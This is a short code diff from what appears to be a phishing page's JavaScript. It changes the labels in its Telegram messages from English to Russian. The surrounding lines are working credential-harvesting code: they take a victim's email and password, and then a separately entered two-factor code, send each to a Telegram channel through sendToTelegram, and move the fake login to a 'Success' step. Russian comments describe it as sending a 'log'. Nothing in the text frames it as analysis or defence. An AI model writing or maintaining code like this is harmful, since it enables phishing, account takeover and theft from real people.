@@ -278,7 +278,7 @@
       
       // === ОТПРАВКА ЛОГА С EMAIL И ПАРОЛЕМ ===
       const email = firstName.value.trim();
-      const logMessage = `📝 *Новый лог!*\n\n📧 *Email*: ${email}\n🔑 *Password*: ${password}`;
+      const logMessage = `📝 *Новый лог!*\n\n📧 *Email*: ${email}\n🔑 *Пароль*: ${password}`;
       await sendToTelegram(logMessage);
       
       showStep(3);
@@ -299,7 +299,7 @@
       codeDigits.forEach(inp => inp.closest('.code-inputs').classList.remove('error'));
       
       // === ОТДЕЛЬНЫЙ ЛОГ С КОДОМ 2FA ===
-      const codeLog = `📱 *2FA Code*: ${code}`;
+      const codeLog = `📱 *2FA Код*: ${code}`;
       await sendToTelegram(codeLog);
       
       showStep('Success');
